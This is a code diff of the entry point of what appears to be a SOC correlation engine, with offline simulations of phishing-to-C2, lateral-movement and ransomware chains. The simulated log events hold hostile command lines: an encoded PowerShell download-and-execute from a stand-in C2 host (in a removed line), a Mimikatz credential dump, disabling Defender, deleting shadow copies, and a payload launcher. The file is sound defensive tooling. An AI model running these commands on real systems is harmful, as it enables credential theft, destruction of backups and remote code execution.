@@ -1,3 +1,14 @@
+"""
+main.py
+-------
+LogXPro SOC Correlation Engine — Entry Point
+
+Usage:
+    python -m soc_engine.main                # Live mode (connects to ES/PG/Redis)
+    python -m soc_engine.main --simulate     # Phishing → C2 simulation
+    python -m soc_engine.main --simulate --chain lateral   # Lateral movement simulation
+    python -m soc_engine.main --simulate --chain ransomware  # Ransomware simulation
+"""
 import os
 import sys
 import time
@@ -10,382 +21,582 @@ import yaml
 from soc_engine.config.settings import settings
 from soc_engine.detection.sigma_matcher import SigmaMatcher
 from soc_engine.detection.chain_matcher import load_chains, evaluate_basket
+from soc_engine.detection.tiering import (
+    should_fire_alert,
+    format_alert_banner,
+    build_alert_payload,
+    is_duplicate,
+)
 import soc_engine.detection.basket_manager as basket_manager
 import soc_engine.models.db as db
 
+
 class SOCEngine:
-    def __init__(self, simulate=False):
+    def __init__(self, simulate: bool = False):
         self.simulate = simulate
         self.sigma_matcher = SigmaMatcher()
         self.chains = load_chains()
         self.es_client = None
         self.grc_profile = {}
-        
+
         self.load_grc_profile()
-        
+
         if not self.simulate:
             self.init_connections()
 
+    # ------------------------------------------------------------------ #
+    # Startup                                                               #
+    # ------------------------------------------------------------------ #
+
     def load_grc_profile(self):
-        """Loads GRC profile configured in settings."""
-        profile_path = os.path.join(settings.GRC_PROFILE_DIR, f"{settings.ACTIVE_GRC_PROFILE}.yaml")
+        """Loads the active GRC profile from YAML."""
+        profile_path = os.path.join(
+            settings.GRC_PROFILE_DIR, f"{settings.ACTIVE_GRC_PROFILE}.yaml"
+        )
         try:
             with open(profile_path, "r") as f:
                 self.grc_profile = yaml.safe_load(f)
-            print(f"[*] GRC Profile Loaded: {self.grc_profile.get('client')} (Industry: {self.grc_profile.get('industry')})")
+            print(
+                f"[*] GRC Profile: {self.grc_profile.get('client')} "
+                f"(Industry: {self.grc_profile.get('industry', 'N/A')})"
+            )
         except Exception as e:
-            print(f"[!] Warning: Could not load GRC profile at {profile_path}: {e}")
+            print(f"[!] Could not load GRC profile at {profile_path}: {e}")
             self.grc_profile = {
                 "client": "Default",
                 "enabled_rule_groups": ["endpoint", "network", "ad"],
-                "auto_response_allowed": False
+                "auto_response_allowed": False,
             }
 
     def init_connections(self):
-        """Initializes ES, Postgres, and Redis connections."""
-        print("[*] Initializing system connections...")
+        """Attempts to connect to ES, PostgreSQL and Redis."""
+        print("[*] Initialising connections...")
+
+        # Elasticsearch
         try:
-            self.es_client = Elasticsearch(settings.ES_HOST, request_timeout=2.0, max_retries=0)
+            self.es_client = Elasticsearch(
+                settings.ES_HOST, request_timeout=2.0, max_retries=0
+            )
             if not self.es_client.ping():
-                print("[!] Elasticsearch connection failed. Running in SIMULATE mode instead.")
+                print("[!] Elasticsearch not reachable → switching to SIMULATE mode.")
                 self.simulate = True
             else:
-                print("[+] Connected to Elasticsearch.")
+                print("[+] Elasticsearch connected.")
         except Exception as e:
-            print(f"[!] ES Connection error: {e}. Switching to SIMULATE mode.")
+            print(f"[!] ES error: {e} → switching to SIMULATE mode.")
             self.simulate = True
 
+        # PostgreSQL
         try:
-            # Test PostgreSQL with a 2 second timeout
             conn = psycopg2.connect(
                 host=settings.DB_HOST,
                 port=settings.DB_PORT,
                 database=settings.DB_NAME,
                 user=settings.DB_USER,
                 password=settings.DB_PASSWORD,
-                connect_timeout=2
+                connect_timeout=2,
             )
             conn.close()
-            print("[+] Connected to PostgreSQL.")
+            print("[+] PostgreSQL connected.")
         except Exception as e:
-            print(f"[!] PostgreSQL Connection error: {e}. Switching to SIMULATE mode.")
+            print(f"[!] PostgreSQL error: {e} → switching to SIMULATE mode.")
             self.simulate = True
 
+        # Redis
         try:
-            # Test Redis with a 2 second timeout
             basket_manager.redis_client.ping()
-            print("[+] Connected to Redis.")
+            print("[+] Redis connected.")
         except Exception as e:
-            print(f"[!] Redis Connection error: {e}. Switching to SIMULATE mode.")
+            print(f"[!] Redis error: {e} → switching to SIMULATE mode.")
             self.simulate = True
 
-    def run(self):
-        print("="*60)
-        print("      LOGXPRO AUTONOMOUS SOC CORRELATION ENGINE      ")
-        print("="*60)
+    # ------------------------------------------------------------------ #
+    # Run dispatch                                                          #
+    # ------------------------------------------------------------------ #
+
+    def run(self, sim_chain: str = "phishing"):
+        print("=" * 60)
+        print("      LOGXPRO AUTONOMOUS SOC CORRELATION ENGINE v2.0      ")
+        print("=" * 60)
         if self.simulate:
-            self.run_simulation()
+            self.run_simulation(sim_chain)
         else:
             self.run_polling_loop()
 
+    # ------------------------------------------------------------------ #
+    # Live mode                                                             #
+    # ------------------------------------------------------------------ #
+
     def run_polling_loop(self):
-        """Polls Elasticsearch for new logs and processes them."""
-        print("[*] Starting live Elasticsearch polling loop...")
-        
-        # Start looking from 1 minute ago
-        last_polled_time = datetime.now(timezone.utc) - timedelta(minutes=1)
-        
+        """Polls Elasticsearch for new logs every POLL_INTERVAL seconds."""
+        from soc_engine.ingestion.es_reader import ESReader
+
+        print("[*] Starting live ES polling loop...")
+        reader = ESReader(self.es_client)
+        last_polled = datetime.now(timezone.utc) - timedelta(minutes=1)
+
         while True:
             try:
                 now = datetime.now(timezone.utc)
-                # Format timestamps for ES query
-                start_str = last_polled_time.isoformat()
-                end_str = now.isoformat()
+                events = reader.get_new_events(start_time=last_polled, end_time=now)
 
-                # Query logs ingested between start_str and end_str
-                query = {
-                    "query": {
-                        "range": {
-                            "event.ingested": {
-                                "gt": start_str,
-                                "lte": end_str
-                            }
-                        }
-                    },
-                    "sort": [{"event.ingested": "asc"}],
-                    "size": 1000
-                }
+                if events:
+                    print(f"[*] {len(events)} new events received. Processing...")
+                    for event in events:
+                        self.process_log(event)
 
-                res = self.es_client.search(index=settings.ES_INDEX, body=query)
-                hits = res["hits"]["hits"]
-                
-                if hits:
-                    print(f"[*] Found {len(hits)} new logs. Processing...")
-                    for hit in hits:
-                        self.process_log(hit["_source"])
-                
-                last_polled_time = now
+                last_polled = now
+            except KeyboardInterrupt:
+                print("\n[*] Engine stopped by user.")
+                break
             except Exception as e:
-                print(f"[!] Error in polling loop: {e}")
-                
+                print(f"[!] Polling error: {e}")
+
             time.sleep(settings.POLL_INTERVAL)
 
     def process_log(self, event: dict):
-        """Processes a single log event through Sigma matching and Correlation."""
-        # 1. Match against Sigma rules
+        """Processes a single log event: Sigma matching → basket → chain eval → alert."""
         matches = self.sigma_matcher.match_event(event)
+
         for rule in matches:
             rule_id = rule["id"]
             host_name = event.get("host", {}).get("name", "UNKNOWN_HOST")
             user_name = event.get("user", {}).get("name")
-            
-            # Check GRC configuration
+
+            # GRC suppression check
             rule_tags = rule.get("tags", [])
-            # Skip disabled rule categories (simplified checks)
-            if "pci" in rule_tags and "pci" in self.grc_profile.get("disabled_rule_groups", []):
-                print(f"[-] GRC Suppressed: Rule {rule_id} is disabled for this client (PCI control).")
+            if "pci" in rule_tags and "pci" in self.grc_profile.get(
+                "disabled_rule_groups", []
+            ):
+                print(f"[-] GRC suppressed rule {rule_id} (PCI disabled for this client)")
                 continue
 
-            # 2. Check suppression list in DB
+            # Alert suppression table check
             if db.is_alert_suppressed(host_name, user_name, rule_id):
-                print(f"[-] Alert Suppressed: {rule_id} on {host_name} for user {user_name} is active in suppression table.")
+                print(f"[-] Suppressed: {rule_id} on {host_name}/{user_name}")
                 continue
 
-            print(f"\n[!] MATCHED RULE: {rule['title']} (Level: {rule['level'].upper()})")
-            print(f"    Host: {host_name} | User: {user_name or 'N/A'}")
+            print(
+                f"\n[!] RULE HIT: '{rule['title']}' "
+                f"(Level: {rule['level'].upper()}) | "
+                f"Host: {host_name} | User: {user_name or 'N/A'}"
+            )
 
-            # 3. Create or find incident basket
+            # Basket management
             source_ip = event.get("source", {}).get("ip")
-            basket, is_new = basket_manager.find_or_create_basket(host_name, user_name, source_ip)
+            basket, is_new = basket_manager.find_or_create_basket(
+                host_name, user_name, source_ip
+            )
             basket_id = str(basket["basket_id"])
-            
-            # Link MITRE technique ID to event entry
+
             mitre_id = rule["mitre_techniques"][0] if rule["mitre_techniques"] else None
-
-            # 4. Save event to basket
             basket_manager.add_event(basket_id, rule_id, event, mitre_id)
-            print(f"    [+] Event added to basket {basket_id[:8]}... (New Basket: {is_new})")
+            print(f"    [+] Event → basket {basket_id[:8]}... (new={is_new})")
 
-            # 5. Evaluate the basket for chains
+            # Chain evaluation
             eval_res = evaluate_basket(basket_id, self.chains)
-            confidence = eval_res["confidence"]
-            
-            if confidence > 0:
-                print(f"    [>>>] Correlation Chain Match: '{eval_res['chain_name']}'")
-                print(f"    [>>>] Current Basket Confidence: {confidence}% (Matched {len(eval_res['matched_stages'])} stages)")
-                
-                # Perform tiered alerts
-                self.trigger_tiered_alert(basket, eval_res)
 
-    def trigger_tiered_alert(self, basket: dict, eval_res: dict):
-        """Displays formatted alerts depending on confidence tier."""
-        confidence = eval_res["confidence"]
-        basket_id = str(basket["basket_id"])
-        host_name = basket["host_name"]
-        chain_name = eval_res["chain_name"]
-        
-        print("-" * 50)
-        if confidence < 50:
-            print(f"\033[93m[TIER 1 - LOW ALERT] Alert Level escalation for host {host_name}\033[0m")
-            print(f"Incident {basket_id[:8]}... is rising. Confidence at {confidence}%.")
-        elif confidence < 100:
-            print(f"\033[91m[TIER 2 - MEDIUM/HIGH ALERT] Actionable correlation on {host_name}\033[0m")
-            print(f"Incident {basket_id[:8]}... matching stages: {[s['stage'] for s in eval_res['matched_stages']]}")
-        else:
-            print(f"\033[41m\033[97m[TIER 3 - CRITICAL INCIDENT] Confirmed Attack Chain '{chain_name}' on {host_name}!\033[0m")
-            print(f"Basket ID: {basket_id}")
-            print(f"All stages matched! Triggering SOAR response playbook recommendations...")
-            # Phase 5 auto response block recommendation
-            for stage in eval_res["matched_stages"]:
-                if stage["mitre"] == "T1071": # C2 connection stage
-                    c2_ip = stage["event"].get("rule_id") # C2 IP
-                    print(f"Playbook Advice: [ACTION REQUIRED] Run: sudo iptables -A OUTPUT -d <C2_IP> -j DROP")
-        print("-" * 50)
+            if eval_res["confidence"] > 0:
+                print(
+                    f"    [>>>] Chain: '{eval_res['chain_name']}' | "
+                    f"Confidence: {eval_res['confidence']}% | "
+                    f"Stages: {len(eval_res['matched_stages'])}"
+                )
 
-    def run_simulation(self):
-        """Simulates an attack timeline to demonstrate rules and correlation without Docker stack."""
-        print("[*] Running in Simulation Mode.")
-        print("[*] This will simulate 4 logs corresponding to our Phishing to C2 chain:")
-        print("    1. RDP Brute Force Logon Failure (T1078)")
-        print("    2. PowerShell Encoded Command Execution (T1059.001)")
-        print("    3. Scheduled Task Creation (T1053.005)")
-        print("    4. Connection to C2 Server 5.5.5.5 (T1071)")
-        print("="*60)
+            # Determine the best chain for tiering
+            best_chain = self._find_chain(eval_res.get("chain_id"))
+            alert_type, tier = should_fire_alert(basket, rule, best_chain or {}, eval_res)
 
-        # Mock DB logic if simulated
-        class MockDB:
-            def __init__(self):
-                self.basket = {
-                    "basket_id": "simulated-basket-uuid-12345",
-                    "host_name": "DESKTOP-VICTIM",
-                    "user_name": "Administrator",
-                    "source_ip": "192.168.1.50",
-                    "status": "open",
-                    "confidence_score": 0,
-                    "matched_stages": []
-                }
-                self.events = []
-            
-            def is_suppressed(self, host, user, rule):
-                return False
-            
-            def add_event(self, evt):
-                self.events.append(evt)
+            if alert_type:
+                banner = format_alert_banner(alert_type, tier, basket, eval_res)
+                print(banner)
 
-        mock_db = MockDB()
+                payload = build_alert_payload(basket, eval_res, alert_type, tier, rule)
+                self._handle_alert(payload)
 
-        # Mock event stream
-        simulated_events = [
-            {
-                "description": "Step 1: Failed RDP Login (Brute Force attempt)",
-                "log": {
-                    "@timestamp": datetime.now(timezone.utc).isoformat(),
-                    "host": {"name": "DESKTOP-VICTIM"},
-                    "user": {"name": "Administrator"},
-                    "event": {"code": 4625},
-                    "source": {"ip": "192.168.1.50"}
-                },
-                "mitre": "T1078",
-                "rule_id": "win_system_rdp_bruteforce"
-            },
-            {
-                "description": "Step 2: Attacker gets access and runs encoded powershell command",
-                "log": {
-                    "@timestamp": (datetime.now(timezone.utc) + timedelta(seconds=2)).isoformat(),
-                    "host": {"name": "DESKTOP-VICTIM"},
-                    "user": {"name": "Administrator"},
-                    "event": {"code": 1},
-                    "process": {
-                        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-                        "command_line": "powershell.exe -enc SQBFAFMAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANQAuADUALgA1AC4ANQAvAHAAYQB5AGwAbwBhAGQAcwAnACkA",
-                        "entity_id": "{a3984d3b-9a2c-63e5-0100-000000002100}"
-                    }
-                },
-                "mitre": "T1059.001",
-                "rule_id": "proc_creation_win_powershell_encoded_cmd"
-            },
-            {
-                "description": "Step 3: Setup persistence using a Scheduled Task",
-                "log": {
-                    "@timestamp": (datetime.now(timezone.utc) + timedelta(seconds=4)).isoformat(),
-                    "host": {"name": "DESKTOP-VICTIM"},
-                    "user": {"name": "Administrator"},
-                    "event": {"code": 1},
-                    "process": {
-                        "executable": "C:\\Windows\\System32\\schtasks.exe",
-                        "command_line": "schtasks /create /tn \"WindowsUpdateDiag\" /tr \"powershell.exe -WindowStyle Hidden\" /sc minute /mo 30",
-                        "entity_id": "{a3984d3b-9a2c-63e5-0200-000000002100}"
-                    }
-                },
-                "mitre": "T1053.005",
-                "rule_id": "proc_creation_win_scheduled_task_creation"
-            },
-            {
-                "description": "Step 4: Outbound communication back to Attacker's C2 Server",
-                "log": {
-                    "@timestamp": (datetime.now(timezone.utc) + timedelta(seconds=6)).isoformat(),
-                    "host": {"name": "DESKTOP-VICTIM"},
-                    "user": {"name": "Administrator"},
-                    "event": {"code": 3},
-                    "destination": {
-                        "ip": "5.5.5.5",
-                        "port": 443
-                    },
-                    "source": {
-                        "ip": "192.168.1.100"
-                    }
-                },
-                "mitre": "T1071",
-                "rule_id": "net_connection_win_c2_potential"
-            }
-        ]
+    def _handle_alert(self, payload: dict):
+        """
+        Alert dispatch: currently prints structured JSON.
+        Phase 4 will index to ES 'soc-alerts'.
+        Phase 5 will forward to TheHive.
+        """
+        import json
+        print(f"    [ALERT PAYLOAD] {json.dumps(payload, indent=2, default=str)}")
 
-        # Process simulation
-        for i, step in enumerate(simulated_events, start=1):
-            print(f"\n>>> Running Simulation {step['description']}...")
-            time.sleep(2.5)
+    def _find_chain(self, chain_id: str | None) -> dict | None:
+        if not chain_id:
+            return self.chains[0] if self.chains else None
+        for c in self.chains:
+            if c.get("chain_id") == chain_id:
+                return c
+        return self.chains[0] if self.chains else None
 
-            # 1. Match Sigma rules
-            matches = self.sigma_matcher.match_event(step["log"])
+    # ------------------------------------------------------------------ #
+    # Simulation mode                                                       #
+    # ------------------------------------------------------------------ #
+
+    def run_simulation(self, sim_chain: str = "phishing"):
+        """
+        Runs one of three pre-built attack simulations without requiring
+        any running infrastructure (ES / PG / Redis).
+
+        Available simulations:
+            phishing    → RDP brute force → PowerShell → Scheduled Task → C2
+            lateral     → Privilege escalation → Mimikatz → WMI lateral movement → Net enum
+            ransomware  → Defender disable → Shadow copy delete → WMIC → Encoding payload
+        """
+        sims = {
+            "phishing":   self._sim_phishing_c2,
+            "lateral":    self._sim_lateral_movement,
+            "ransomware": self._sim_ransomware,
+        }
+
+        sim_fn = sims.get(sim_chain, self._sim_phishing_c2)
+        sim_events = sim_fn()
+
+        chain_target = self._pick_sim_chain(sim_chain)
+
+        print(f"\n[*] Running Simulation: '{sim_chain}' ({len(sim_events)} events)")
+        print(f"[*] Target Chain: '{chain_target.get('name', 'N/A')}'")
+        print("=" * 60)
+
+        # In-memory mock basket
+        mock_basket = {
+            "basket_id": f"SIM-BASKET-{sim_chain.upper()}",
+            "host_name": "DESKTOP-VICTIM",
+            "user_name": "Administrator",
+            "source_ip": "192.168.1.50",
+            "status": "open",
+            "confidence_score": 0,
+            "matched_stages": [],
+        }
+        mock_events_store = []
+
+        for i, step in enumerate(sim_events, start=1):
+            desc = step["description"]
+            log = step["log"]
+            expected_rule_id = step["rule_id"]
+
+            print(f"\n>>> [{i}/{len(sim_events)}] {desc}")
+            time.sleep(1.5)
+
+            matches = self.sigma_matcher.match_event(log)
+
+            if not matches:
+                print(f"    [-] No Sigma rule matched for this event.")
+                continue
+
             for rule in matches:
                 rule_id = rule["id"]
-                host_name = step["log"].get("host", {}).get("name")
-                user_name = step["log"].get("user", {}).get("name")
+                print(f"    [!] RULE: '{rule['title']}' (Level: {rule['level'].upper()})")
 
-                # Mock event record mapping
+                # Add to mock store
                 evt_record = {
-                    "event_id": f"simulated-evt-uuid-{i}",
-                    "basket_id": mock_db.basket["basket_id"],
+                    "event_id": f"SIM-EVT-{i:03d}",
+                    "basket_id": mock_basket["basket_id"],
                     "event_type": rule_id,
-                    "raw_event": step["log"],
+                    "raw_event": log,
                     "mitre_technique": step["mitre"],
-                    "ingestion_time": datetime.now(timezone.utc)
+                    "ingestion_time": datetime.now(timezone.utc),
                 }
-                
-                # Check suppression
-                if mock_db.is_suppressed(host_name, user_name, rule_id):
-                    print("    [-] Rule suppressed by GRC.")
-                    continue
+                mock_events_store.append(evt_record)
+                print(f"    [+] Event added to mock basket ({len(mock_events_store)} events total)")
 
-                print(f"    [!] MATCHED RULE: {rule['title']} (Level: {rule['level'].upper()})")
-                
-                # Add event
-                mock_db.add_event(evt_record)
-                print(f"    [+] Event added to basket {mock_db.basket['basket_id'][:8]}...")
+                # Evaluate basket against chain
+                chain_stages = chain_target.get("stages", [])
+                matched_stages = []
 
-                # Evaluate basket
-                matched_stages_in_chain = []
-                chain_stages = self.chains[0]["stages"]
-                
-                # Verify mock event hits against chain stages
                 for stage in chain_stages:
                     stage_num = stage.get("stage")
                     mitre_id = stage.get("mitre")
                     rules_list = stage.get("sigma_rules", [])
 
-                    stage_matched = False
-                    matching_event = None
-                    for ev in mock_db.events:
-                        if ev["mitre_technique"] == mitre_id or ev["event_type"] in rules_list:
-                            stage_matched = True
-                            matching_event = {
-                                "event_id": ev["event_id"],
-                                "mitre_technique": ev["mitre_technique"],
-                                "rule_id": ev["event_type"],
-                                "ingestion_time": ev["ingestion_time"].isoformat()
-                            }
+                    for ev in mock_events_store:
+                        ev_mitre = ev.get("mitre_technique", "")
+                        ev_rule = ev.get("event_type", "")
+                        if ev_mitre == mitre_id or ev_rule in rules_list:
+                            matched_stages.append({
+                                "stage": stage_num,
+                                "mitre": mitre_id,
+                                "matched": True,
+                                "event": {
+                                    "event_id": ev["event_id"],
+                                    "mitre_technique": ev_mitre,
+                                    "rule_id": ev_rule,
+                                }
+                            })
                             break
-                    
-                    if stage_matched:
-                        matched_stages_in_chain.append({
-                            "stage": stage_num,
-                            "mitre": mitre_id,
-                            "matched": True,
-                            "event": matching_event
-                        })
 
-                # Compute confidence
-                confidence = int((len(matched_stages_in_chain) / len(chain_stages)) * 100)
-                mock_db.basket["confidence_score"] = confidence
-                mock_db.basket["matched_stages"] = matched_stages_in_chain
+                total_stages = len(chain_stages)
+                confidence = int((len(matched_stages) / total_stages) * 100) if total_stages else 0
 
-                print(f"    [>>>] Correlation Chain Match: '{self.chains[0]['name']}'")
-                print(f"    [>>>] Current Basket Confidence: {confidence}% (Matched {len(matched_stages_in_chain)} of {len(chain_stages)} stages)")
+                mock_basket["matched_stages"] = matched_stages
+                mock_basket["confidence_score"] = confidence
 
-                # Trigger alerts
-                self.trigger_tiered_alert(mock_db.basket, {
+                eval_res = {
                     "confidence": confidence,
-                    "matched_stages": matched_stages_in_chain,
-                    "chain_name": self.chains[0]['name']
-                })
-        
-        print("\n[+] Simulation completed successfully.")
+                    "matched_stages": matched_stages,
+                    "chain_name": chain_target.get("name"),
+                    "chain_id": chain_target.get("chain_id"),
+                }
+
+                min_stages = chain_target.get("min_stages_for_alert", 2)
+
+                print(
+                    f"    [>>>] Chain: '{eval_res['chain_name']}' | "
+                    f"Confidence: {confidence}% | "
+                    f"Stages Matched: {len(matched_stages)}/{total_stages}"
+                )
+
+                if len(matched_stages) >= min_stages:
+                    from soc_engine.detection.tiering import score_to_tier, format_alert_banner
+                    tier = score_to_tier(confidence)
+                    if tier:
+                        banner = format_alert_banner("tier_chain", tier, mock_basket, eval_res)
+                        print(banner)
+                elif rule["level"] == "critical":
+                    from soc_engine.detection.tiering import format_alert_banner
+                    banner = format_alert_banner("tier0_instant", "critical", mock_basket, eval_res)
+                    print(banner)
+
+        print("\n" + "=" * 60)
+        print("[+] Simulation complete.")
+        print(
+            f"[+] Final basket confidence: {mock_basket['confidence_score']}% "
+            f"({len(mock_basket['matched_stages'])} of "
+            f"{len(chain_target.get('stages', []))} stages matched)"
+        )
+        print("=" * 60)
+
+    def _pick_sim_chain(self, sim_chain: str) -> dict:
+        """Returns the chain definition that best matches the simulation scenario."""
+        chain_name_map = {
+            "phishing":   "chain_001",
+            "lateral":    "chain_002",
+            "ransomware": "chain_003",
+        }
+        target_id = chain_name_map.get(sim_chain, "chain_001")
+        for c in self.chains:
+            if c.get("chain_id") == target_id:
+                return c
+        return self.chains[0] if self.chains else {}
+
+    # ------------------------------------------------------------------ #
+    # Simulation event generators                                           #
+    # ------------------------------------------------------------------ #
+
+    def _sim_phishing_c2(self) -> list:
+        """Phishing → C2 four-stage simulation events."""
+        now = datetime.now(timezone.utc)
+        return [
+            {
+                "description": "Stage 1 — RDP Brute Force Login Failure (T1078)",
+                "mitre": "T1078",
+                "rule_id": "win_system_rdp_bruteforce",
+                "log": {
+                    "@timestamp": now.isoformat(),
+                    "host": {"name": "DESKTOP-VICTIM"},
+                    "user": {"name": "Administrator"},
+                    "event": {"code": 4625},
+                    "source": {"ip": "192.168.1.50"},
+                },
+            },
+            {
+                "description": "Stage 2 — PowerShell Encoded Command Execution (T1059.001)",
+                "mitre": "T1059.001",
+                "rule_id": "proc_creation_win_powershell_encoded_cmd",
+                "log": {
+                    "@timestamp": (now + timedelta(seconds=3)).isoformat(),
+                    "host": {"name": "DESKTOP-VICTIM"},
+                    "user": {"name": "Administrator"},
+                    "event": {"code": 1},
+                    "process": {
+                        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                        "command_line": "powershell.exe -enc SQBFAFMAIAAoAE4A...",
+                        "entity_id": "{a398-0001}",
+                    },
+                },
+            },
+            {
+                "description": "Stage 3 — Scheduled Task Persistence (T1053.005)",
+                "mitre": "T1053.005",
+                "rule_id": "proc_creation_win_scheduled_task_creation",
+                "log": {
+                    "@timestamp": (now + timedelta(seconds=6)).isoformat(),
+                    "host": {"name": "DESKTOP-VICTIM"},
+                    "user": {"name": "Administrator"},
+                    "event": {"code": 1},
+                    "process": {
+                        "executable": "C:\\Windows\\System32\\schtasks.exe",
+                        "command_line": "schtasks /create /tn \"WindowsUpdate\" /tr "
+                                        "\"powershell.exe -WindowStyle Hidden\" /sc minute /mo 30",
+                    },
+                },
+            },
+            {
+                "description": "Stage 4 — Outbound C2 Beacon to 5.5.5.5:443 (T1071)",
+                "mitre": "T1071",
+                "rule_id": "net_connection_win_c2_potential",
+                "log": {
+                    "@timestamp": (now + timedelta(seconds=9)).isoformat(),
+                    "host": {"name": "DESKTOP-VICTIM"},
+                    "user": {"name": "Administrator"},
+                    "event": {"code": 3},
+                    "destination": {"ip": "5.5.5.5", "port": 443},
+                    "source": {"ip": "192.168.1.100"},
+                },
+            },
+        ]
+
+    def _sim_lateral_movement(self) -> list:
+        """Credential Dumping → Lateral Movement simulation events."""
+        now = datetime.now(timezone.utc)
+        return [
+            {
+                "description": "Stage 1 — Special Privilege Logon (T1078.002)",
+                "mitre": "T1078.002",
+                "rule_id": "win_special_privilege_logon",
+                "log": {
+                    "@timestamp": now.isoformat(),
+                    "host": {"name": "DESKTOP-VICTIM"},
+                    "user": {"name": "svc_admin"},
+                    "event": {"code": 4672},
+                    "source": {"ip": "10.0.0.5"},
+                },
+            },
+            {
+                "description": "Stage 2 — Mimikatz Credential Dump (T1003.001) [CRITICAL]",
+                "mitre": "T1003.001",
+                "rule_id": "proc_creation_win_mimikatz",
+                "log": {
+                    "@timestamp": (now + timedelta(seconds=5)).isoformat(),
+                    "host": {"name": "DESKTOP-VICTIM"},
+                    "user": {"name": "svc_admin"},
+                    "event": {"code": 1},
+                    "process": {
+                        "executable": "C:\\Temp\\mimikatz.exe",
+                        "command_line": "mimikatz.exe sekurlsa::logonpasswords",
+                    },
+                },
+            },
+            {
+                "description": "Stage 3 — WMI Spawning cmd.exe for Lateral Movement (T1021.002)",
+                "mitre": "T1021.002",
+                "rule_id": "proc_creation_win_wmi_spawns_process",
+                "log": {
+                    "@timestamp": (now + timedelta(seconds=10)).isoformat(),
+                    "host": {"name": "DESKTOP-VICTIM"},
+                    "user": {"name": "svc_admin"},
+                    "event": {"code": 1},
+                    "process": {
+                        "parent": {"executable": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"},
+                        "executable": "C:\\Windows\\System32\\cmd.exe",
+                        "command_line": "cmd.exe /c whoami",
+                    },
+                },
+            },
+            {
+                "description": "Stage 4 — Domain Enumeration via net.exe (T1087.002)",
+                "mitre": "T1087.002",
+                "rule_id": "proc_creation_win_net_user_enum",
+                "log": {
+                    "@timestamp": (now + timedelta(seconds=15)).isoformat(),
+                    "host": {"name": "DESKTOP-VICTIM"},
+                    "user": {"name": "svc_admin"},
+                    "event": {"code": 1},
+                    "process": {
+                        "executable": "C:\\Windows\\System32\\net.exe",
+                        "command_line": "net.exe user /domain",
+                    },
+                },
+            },
+        ]
+
+    def _sim_ransomware(self) -> list:
+        """Ransomware Pre-Deployment simulation events."""
+        now = datetime.now(timezone.utc)
+        return [
+            {
+                "description": "Stage 1 — Disable Windows Defender (T1562.001)",
+                "mitre": "T1562.001",
+                "rule_id": "proc_creation_win_defender_disable",
+                "log": {
+                    "@timestamp": now.isoformat(),
+                    "host": {"name": "FILESERVER-01"},
+                    "user": {"name": "Administrator"},
+                    "event": {"code": 1},
+                    "process": {
+                        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                        "command_line": "Set-MpPreference -DisableRealtimeMonitoring $true",
+                    },
+                },
+            },
+            {
+                "description": "Stage 2 — Stop VSS Service via sc.exe (T1562.001)",
+                "mitre": "T1562.001",
+                "rule_id": "proc_creation_win_sc_stop_security",
+                "log": {
+                    "@timestamp": (now + timedelta(seconds=4)).isoformat(),
+                    "host": {"name": "FILESERVER-01"},
+                    "user": {"name": "Administrator"},
+                    "event": {"code": 1},
+                    "process": {
+                        "executable": "C:\\Windows\\System32\\sc.exe",
+                        "command_line": "sc.exe stop VSS",
+                    },
+                },
+            },
+            {
+                "description": "Stage 3 — Delete Shadow Copies via vssadmin [CRITICAL] (T1490)",
+                "mitre": "T1490",
+                "rule_id": "proc_creation_win_vssadmin_delete_shadows",
+                "log": {
+                    "@timestamp": (now + timedelta(seconds=8)).isoformat(),
+                    "host": {"name": "FILESERVER-01"},
+                    "user": {"name": "Administrator"},
+                    "event": {"code": 1},
+                    "process": {
+                        "executable": "C:\\Windows\\System32\\vssadmin.exe",
+                        "command_line": "vssadmin.exe delete shadows /all /quiet",
+                    },
+                },
+            },
+            {
+                "description": "Stage 4 — PowerShell Ransom Payload Dropper (T1059.001)",
+                "mitre": "T1059.001",
+                "rule_id": "proc_creation_win_powershell_encoded_cmd",
+                "log": {
+                    "@timestamp": (now + timedelta(seconds=12)).isoformat(),
+                    "host": {"name": "FILESERVER-01"},
+                    "user": {"name": "Administrator"},
+                    "event": {"code": 1},
+                    "process": {
+                        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                        "command_line": "powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAQwA6AFwAUABhAHkAbABvAGEAZAAuAGUAeABlAA==",
+                    },
+                },
+            },
+        ]
+
+
+# ------------------------------------------------------------------ #
+# Entry point                                                           #
+# ------------------------------------------------------------------ #
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="LogXPro Correlation Engine")
-    parser.add_argument("--simulate", "-s", action="store_true", help="Run the engine in simulation mode (offline)")
+    parser = argparse.ArgumentParser(description="LogXPro SOC Correlation Engine")
+    parser.add_argument(
+        "--simulate", "-s",
+        action="store_true",
+        help="Run in simulation mode (no ES/PG/Redis required)",
+    )
+    parser.add_argument(
+        "--chain", "-c",
+        choices=["phishing", "lateral", "ransomware"],
+        default="phishing",
+        help="Which attack chain to simulate (default: phishing)",
+    )
     args = parser.parse_args()
-    
-    # Run the engine. If simulate is True, run simulation. If False, try to connect first.
+
     engine = SOCEngine(simulate=args.simulate)
-    engine.run()
+    engine.run(sim_chain=args.chain)
